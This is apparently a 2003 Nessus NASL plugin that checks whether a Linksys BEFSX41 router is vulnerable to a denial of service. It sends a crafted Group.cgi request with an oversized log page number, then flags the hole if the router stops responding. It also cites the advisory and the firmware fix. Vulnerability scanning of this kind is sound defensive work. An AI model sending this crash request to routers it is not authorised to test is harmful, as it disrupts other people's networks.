#
# Linksys EtherFast Cable/DSL Firewall Router
# BEFSX41 (Firmware 1.44.3) DoS
#

if(description)
{
  script_id(11891);
  script_bugtraq_id(8834);
  script_version ("$Revision: 1.3 $");

  name["english"] = "LinkSys EtherFast Router Denial of Service Attack";
  script_name(english:name["english"]);

  desc["english"] = "
The remote host seems to be a Linksys EtherFast Cable Firewall/Router.

This product is vulnerable to a remote Denial of service attack : if logging 
is enabled, an attacker can specify a long URL which results in the router 
becoming unresponsive.

See also: http://www.digitalpranksters.com/advisories/linksys/LinksysBEFSX41DoSa.html

Solution: Update firmware to version 1.45.3 
          http://www.linksys.com/download/firmware.asp?fwid=172.

Risk: High";


  script_description(english:desc["english"]);
  summary["english"] = "URL results in DoS of Linksys router";
  script_summary(english:summary["english"]);
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2003 Matt North");

  family["english"] = "Denial of Service";
   script_family(english:family["english"]);
  script_dependencie("find_service.nes");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");


port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0);

banner = get_http_banner(port:port);
if(!banner)exit(0);
if("linksys" >!< banner)exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);


req = http_get(port: port, item: "/Group.cgi?Log_Page_Num=1111111111&LogClear=0");
send(socket: soc , data: req);
close(soc);
alive = open_sock_tcp(port);
if (!alive) security_hole(port);
